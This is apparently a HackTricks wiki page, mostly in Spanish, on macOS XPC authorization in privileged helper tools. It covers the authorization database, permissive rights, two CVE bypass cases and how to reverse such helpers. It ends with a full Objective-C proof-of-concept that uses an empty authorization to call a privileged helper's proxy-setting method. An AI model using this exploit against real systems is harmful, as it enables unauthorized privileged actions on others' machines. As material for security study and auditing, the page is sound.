# Autorización XPC en macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Autorización XPC

Apple también propone otra forma de autenticación si el proceso que se conecta tiene **permisos para llamar a un método XPC expuesto**.

Cuando una aplicación necesita **ejecutar acciones como un usuario privilegiado**, en lugar de ejecutar la app como usuario privilegiado normalmente instala como root un HelperTool como servicio XPC que puede ser llamado desde la app para realizar esas acciones. Sin embargo, la app que llama al servicio debería tener suficiente autorización.

### ShouldAcceptNewConnection siempre YES

Un ejemplo puede encontrarse en [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). En `App/AppDelegate.m` intenta **conectarse** al **HelperTool**. Y en `HelperTool/HelperTool.m` la función **`shouldAcceptNewConnection`** **no verifica** ninguno de los requisitos indicados anteriormente. Siempre devolverá YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Para más información sobre cómo configurar correctamente esta comprobación:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Derechos de la aplicación

Sin embargo, hay cierta **autorización en curso cuando se llama a un método del HelperTool**.

La función **`applicationDidFinishLaunching`** de `App/AppDelegate.m` creará una referencia de autorización vacía después de que la app se haya iniciado. Esto siempre debería funcionar.\
Luego, intentará **añadir algunos derechos** a esa referencia de autorización llamando a `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
La función `setupAuthorizationRights` de `Common/Common.m` almacenará en la base de datos de autorización `/var/db/auth.db` los derechos de la aplicación. Nótese cómo solo añadirá los derechos que aún no están en la base de datos:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
La función `enumerateRightsUsingBlock` se utiliza para obtener los permisos de las aplicaciones, que se definen en `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Esto significa que al final de este proceso, los permisos declarados dentro de `commandInfo` se almacenarán en `/var/db/auth.db`. Fíjate cómo allí puedes encontrar para **cada método** que **requiere autenticación**, el **nombre del permiso** y el **`kCommandKeyAuthRightDefault`**. Este último **indica quién puede obtener este derecho**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">Nombre</th><th width="165">Valor</th><th>Descripción</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Cualquiera</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nadie</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>El usuario actual debe ser administrador (dentro del grupo admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Solicita que el usuario se autentique.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Solicita que el usuario se autentique. Debe ser administrador (dentro del grupo admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Especifica reglas</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Especifica algunos comentarios adicionales sobre el derecho</td></tr></tbody></table>

### Verificación de derechos

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **ejecutar dicho método** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **formato correcto** and then will check **qué se necesita para obtener el derecho** to call the specific method. If all goes good the **returned `error` will be `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Tenga en cuenta que para **comprobar los requisitos para obtener el derecho** de llamar a ese método la función `authorizationRightForCommand` simplemente comprobará el objeto comentado anteriormente **`commandInfo`**. Luego, llamará a **`AuthorizationCopyRights`** para verificar **si tiene los derechos** para llamar a la función (observe que las flags permiten interacción con el usuario).

En este caso, para llamar a la función `readLicenseKeyAuthorization` el `kCommandKeyAuthRightDefault` está definido como `@kAuthorizationRuleClassAllow`. Así que **cualquiera puede llamarla**.

### Información de la DB

Se mencionó que esta información se almacena en `/var/db/auth.db`. Puede listar todas las reglas almacenadas con:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
A continuación, puedes leer quién puede acceder al permiso con:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

Puedes encontrar **todas las configuraciones de permisos** [**aquí**](https://www.dssw.co.uk/reference/authorization-rights/), pero las combinaciones que no requerirán interacción del usuario serían:

1. **'authenticate-user': 'false'**
- Esta es la clave más directa. Si está establecida en `false`, especifica que un usuario no necesita proporcionar autenticación para obtener este right.
- Se usa en **combinación con una de las 2 siguientes o indicando un grupo** al que el usuario debe pertenecer.
2. **'allow-root': 'true'**
- Si un usuario está operando como usuario root (que tiene permisos elevados), y esta clave está establecida en `true`, el usuario root podría potencialmente obtener este right sin más autenticación. Sin embargo, típicamente, alcanzar el estado de usuario root ya requiere autenticación, por lo que esto no es un escenario de "sin autenticación" para la mayoría de los usuarios.
3. **'session-owner': 'true'**
- Si está establecido en `true`, el propietario de la sesión (el usuario actualmente conectado) obtendría automáticamente este right. Esto podría eludir autenticaciones adicionales si el usuario ya ha iniciado sesión.
4. **'shared': 'true'**
- Esta clave no concede rights sin autenticación. En cambio, si se establece en `true`, significa que una vez que el right ha sido autenticado, puede compartirse entre múltiples procesos sin que cada uno necesite reautenticar. Pero la concesión inicial del right todavía requeriría autenticación a menos que se combine con otras claves como `'authenticate-user': 'false'`.

Puedes [**usar este script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) para obtener los permisos interesantes:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Casos de bypass de autorización

- **CVE-2024-4395 – Jamf Compliance Editor helper**: Ejecutar un audit deja `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, expone el servicio Mach `com.jamf.complianceeditor.helper` y exporta `-executeScriptAt:arguments:then:` sin verificar el `AuthorizationExternalForm` del llamador ni la firma de código. Un exploit trivial llama a `AuthorizationCreate` con una referencia vacía, se conecta con `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` e invoca el método para ejecutar binarios arbitrarios como root. Notas completas de reversing (y PoC) en [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 y 7.4.0–7.4.2 aceptaron mensajes XPC manipulados que alcanzaban a un helper privilegiado sin controles de autorización. Dado que el helper confiaba en su propio `AuthorizationRef` privilegiado, cualquier usuario local capaz de enviar mensajes al servicio podía forzarlo a ejecutar cambios de configuración o comandos arbitrarios como root. Detalles en [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Consejos rápidos de triaje

- Cuando una app incluye tanto una GUI como un helper, diff their code requirements y comprueba si `shouldAcceptNewConnection` asegura el listener con `-setCodeSigningRequirement:` (o valida `SecCodeCopySigningInformation`). La falta de estas comprobaciones suele dar lugar a escenarios CWE-863 como el caso Jamf. Una mirada rápida se ve así:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Compara lo que el helper *cree* que está autorizando con lo que suministra el cliente. Al hacer reversing, ponte un breakpoint en `AuthorizationCopyRights` y confirma que el `AuthorizationRef` se origina en `AuthorizationCreateFromExternalForm` (provisto por el cliente) en lugar del propio contexto privilegiado del helper; de lo contrario probablemente hayas encontrado un patrón CWE-863 similar a los casos anteriores.

## Reversión de la autorización

### Comprobando si se usa EvenBetterAuthorization

Si encuentras la función: **`[HelperTool checkAuthorization:command:]`** es probable que el proceso esté usando el esquema mencionado anteriormente para la autorización:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Entonces, si esta función llama a funciones como `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, está usando [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Revisa **`/var/db/auth.db`** para ver si es posible obtener permisos para invocar alguna acción privilegiada sin interacción del usuario.

### Comunicación del protocolo

Luego, necesitas encontrar el esquema del protocolo para poder establecer comunicación con el servicio XPC.

La función **`shouldAcceptNewConnection`** indica el protocolo que se está exportando:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

En este caso, tenemos lo mismo que en EvenBetterAuthorizationSample, [**revisa esta línea**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Conociendo el nombre del protocolo usado, es posible **extraer la definición de su header** con:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Por último, solo necesitamos saber el **nombre del Mach Service expuesto** para establecer una comunicación con él. Hay varias maneras de encontrarlo:

- En el **`[HelperTool init]`** donde se puede ver el Mach Service que se está usando:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- En el plist de launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Ejemplo de Exploit

En este ejemplo se crea:

- La definición del protocolo con las funciones
- Un auth vacío para solicitar acceso
- Una conexión al servicio XPC
- Una llamada a la función si la conexión fue exitosa
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Otros auxiliares de privilegios de XPC abusados

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Referencias

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
